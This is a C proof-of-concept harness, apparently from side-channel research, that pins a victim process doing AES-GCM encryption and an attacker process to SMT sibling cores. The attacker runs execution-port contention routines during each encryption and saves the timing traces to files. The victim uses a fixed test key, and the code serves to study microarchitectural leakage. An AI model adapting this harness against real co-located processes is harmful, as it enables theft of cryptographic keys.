#define _GNU_SOURCE
#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <pthread.h>
#include "libxom-aes-gcm.h"

#define countof(x) (sizeof(x)/sizeof(*(x)))

extern void contend_p0(unsigned long* out_buf, unsigned long num_entries);
extern void contend_p1(unsigned long* out_buf, unsigned long num_entries);
extern void contend_p5(unsigned long* out_buf, unsigned long num_entries);
extern void contend_p06(unsigned long* out_buf, unsigned long num_entries);

volatile unsigned char* sync_page = NULL;
aes_gcm_context aes_context;

static void set_processor_affinity(unsigned int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);

    pthread_t current_thread = pthread_self();
    pthread_setaffinity_np(current_thread, sizeof(cpu_set_t), &cpuset);
}

static uint32_t get_sibling_cores(){
    const static size_t max_cpu_cores = 0x100;
    char *line = NULL;
    unsigned int corenum;
    int parsed, count = 0, i, j;
    size_t len = 0;
    FILE* info;
    uint8_t cpu_cores[max_cpu_cores];

    info = fopen( "/proc/cpuinfo", "r");
    if(!info)
        return 1 << 16;

    // Get amount of executable memory regions
    while (getline(&line, &len, info) > 0 && count < max_cpu_cores) {
        parsed = sscanf(line, "core id\t\t: %u", &corenum);
        free(line);
        line = NULL;
        if(parsed <= 0)
            continue;
        cpu_cores[count++] = (uint8_t) corenum;
    }

    fclose(info);

    for(i = count - 1; i >= 0; i--) {
        for(j = i - 1; j >= 0; j--) {
            if(cpu_cores[i] == cpu_cores[j])
                return (((uint32_t) i) << 16) | (uint32_t) j;
        }
    }

    return 1 << 16;
}

// The victim simply waits for the attacker to synchronize, and then starts the encryption
static void __attribute__((noreturn)) victim() {
    for(;;) {
        while (!*sync_page) { asm volatile("lfence"); }
        aes_gcm_encrypt(&aes_context);
        *sync_page = 0;
    }
}

static void attacker() {
    unsigned i;
    static uint64_t result_buffer[0x1000];
    const static struct {
        const char* out_path;
        void (*contention_method)(unsigned long*, unsigned long);
    } ports[] = {
            {"p0.bin", contend_p0},
            {"p1.bin", contend_p1},
            {"p5.bin", contend_p5},
            {"p06.bin", contend_p06},
    };
    FILE* files[countof(ports)];

    for(i = 0; i < countof(ports); i++)
        files[i] = fopen(ports[i].out_path, "w");

    // Make sure everything is cached on the victim's side
    for(i = 0; i < 5; i++){
        *sync_page = 1;
        while(*sync_page) {asm volatile("lfence");}
    }

    // Run the actual attack
    for(i = 0; i < countof(ports); i++) {
        *sync_page = 1;
        ports[i].contention_method(result_buffer, countof(result_buffer));
        while(*sync_page) {asm volatile("lfence");}
        fwrite(result_buffer, sizeof(*result_buffer), countof(result_buffer), files[i]);
        fclose(files[i]);
    }

    puts("Done!");
}


int main() {
    static unsigned char plain[0x1000], cipher[0x1000];
    static aes_uint128 iv = {.u64 = { 0xcafebabecafebabe, 0xdeafbeefdeadbeef}};
    static aes_uint128 tag = {.u64 = { 0, 0}};

    unsigned char* gctr;
    aes_uint128 key = {.u64 = {0xdeafbeefdeadbeef, 0xcafebabecafebabe}};
    uint32_t cores = get_sibling_cores();

    // Set up sync page
    sync_page = mmap(NULL, getpagesize(), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    // Set up encryption parameters
    memset(&aes_context, 0, sizeof(aes_context));
    memset(plain, 0xba, sizeof(plain));
    gctr = mmap(NULL, getpagesize(), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    init_counter_mode_function((aes_fun_code *) gctr, &key);
    aes_context = (aes_gcm_context) {
        .gctr = (gctr_fun) gctr,
        .aad = NULL,
        .aad_size = 0,
        .ciphertext = cipher,
        .plaintext = plain,
        .iv = (char*) &iv,
        .iv_len = sizeof(iv),
        .tag = (char*) &tag,
        .num_blocks = sizeof(plain) / GCM_BLOCK_BYTES,
    };
    *sync_page = 0;

    printf("Running on cores %u and %u!\n", cores & 0xff, cores >> 16);

    // Fork and pivot to SMT sibling cores
    if(!fork()) {
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        set_processor_affinity(cores >> 16);
        victim();
    }

    set_processor_affinity(cores & 0xff);
    attacker();

    return 0;
}